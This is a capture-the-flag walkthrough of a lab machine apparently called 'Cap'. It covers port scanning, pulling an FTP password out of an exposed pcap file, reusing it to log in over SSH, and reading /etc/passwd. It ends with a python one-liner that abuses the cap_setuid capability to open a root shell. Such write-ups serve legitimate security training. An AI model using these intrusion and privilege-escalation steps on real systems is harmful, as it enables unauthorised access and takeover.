# Scope
10.129.20.200

# Information Gathering

let's begin with an `nmap` scan:

```bash
sudo nmap -p- -sS -Pn -T5 10.129.20.200 -o cap-tcp-ports.txt
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```bash
sudo nmap -p- -sU -Pn -T5 10.129.20.200 -o cap-udp-ports.txt
```
or
```bash
nmap -sS -p- -sU --top-ports 20 10.129.20.200
```

```
PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
...
```

# Enumeration

## nmap enumeration scan

```bash
sudo nmap -Pn -p 21,22,80 -sS -sV -sC -O --script vuln -T5 10.129.20.200 -o cap-port-enumeration.txt
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.20.200
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://10.129.20.200:80/
|     Form id:
|     Form action: #
|
|     Path: http://10.129.20.200:80/ip
|     Form id:
|     Form action: #
|
|     Path: http://10.129.20.200:80/netstat
|     Form id:
|_    Form action: #
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-server-header: gunicorn
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## ssh:

SSH server version: `OpenSSH 8.2p1`

## ftp:

ftp server version: `vsftpd 3.0.3`

`searchsploit vsftpd 3.0.3`

```
------------------------------------------------------ --------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ --------------------------
vsftpd 3.0.3 - Remote Denial of Service               | multiple/remote/49719.py
------------------------------------------------------ --------------------------
Shellcodes: No Results
```
> No helpful exploits were found except this possible [backdoor](https://github.com/amdorj/vsftpd-3.0.3-infected/blob/master/amdorj_vsftpd_backdoor.rb).

## http:

### subdomain enumeration

`ffuf -u http://FUZZ.10.129.20.200/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac`

`gobuster dns -d http://10.129.20.200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

```
Nothing Useful
```

### directory enumeration

`gobuster dir --url http://10.129.20.200/ --wordlist /usr/share/dirb/wordlists/common.txt`

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.20.200/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
data                 (Status: 302) [Size: 208] [--> http://10.129.20.200/]
ip                   (Status: 200) [Size: 17455]
netstat              (Status: 200) [Size: 28641]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

### web vulnerability testing

Interacting with this http server via the browser we are greeted with a dashboard:
![[Pasted image 20260208173454.png]]
> Exploring the site we find very interesting information -> netstat output

![[Pasted image 20260208175158.png]]
> Our user is called Nathan

![[Pasted image 20260208175236.png]]
> We found these buttons but the seem to lead to no where

We found good information:
- `nestat` output
- ip config output
- network status
- pcap file downloads

After some investigation we find a place to download pcap files:
![[Pasted image 20260208195257.png]]

![[Pasted image 20260208195321.png]]
Notice that there is a number for each pcap file in the URL, let's try to look for a file that has packets.

we stumble upon this pcap file with the number 0
![[Pasted image 20260208195605.png]]

We can download it and open it in wireshark or tcpdump to view that packets.

![[Pasted image 20260208200221.png]]

After reviewing the packet we found a FTP credential for nathan: 
`nathan:Buck3tH4TF0RM3!`


# Exploitation

Let's use the credentials we found in the pcap file to access the FTP server and attempt to login in to SSH

![[Pasted image 20260208204034.png]]

We found a file called `user.txt` with the first flag

Now try to access the SSH server with the same creds:

`ssh nathan@10.129.29.200`
`Buck3tH4TF0RM3!`

![[Pasted image 20260209074222.png]]
> We're in!

# Post Exploitation:

## internal information gathering

users:
`ls /home`
```
nathan@cap:~$ ls /home
nathan
```

`cat /etc/passwd`
```
...
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
nathan:x:1001:1001::/home/nathan:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

can our current user use sudo:
`sudo -l`
```
nathan@cap:~$ sudo -l
[sudo] password for nathan:
Sorry, user nathan may not run sudo on cap.
```

`sudo --version`
```
nathan@cap:~$ sudo --version
Sudo version 1.8.31
```

After a quick google search we found a priv-esc vuln for this sudo version.
**Vulnerability**: `(CVE-2021-3156)`

we can use the following exploit from github: [priv-esc](https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit)

world writable files
`find / -writable -type d 2>/dev/null`

```
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/init.scope
/tmp
/tmp/.X11-unix
/tmp/.ICE-unix
/tmp/.font-unix
/tmp/.XIM-unix
/tmp/.Test-unix
/home/nathan
/home/nathan/.cache
/var/www/html
/var/www/html/__pycache__
/var/tmp
/var/crash
/dev/mqueue
/dev/shm
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/units
/run/screen
/run/lock
/proc/1675/task/1675/fd
/proc/1675/fd
/proc/1675/map_files
```

`find / -perm -u=s -type f 2>/dev/null`
```
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

`/usr/sbin/getcap -r / 2>/dev/null`
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
## privilege escalation

After reviewing the sudo exploit the machine is not vulnerable.

But, `python3` appears to have a dangerous capability `cap_setuid`

Using the [GTFO Bins](https://gtfobins.org/gtfobins/python/) resource we found a simple way to pop a shell:

`python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`

![[Pasted image 20260209113335.png]]

We pop the root shell quickly find the root flag.


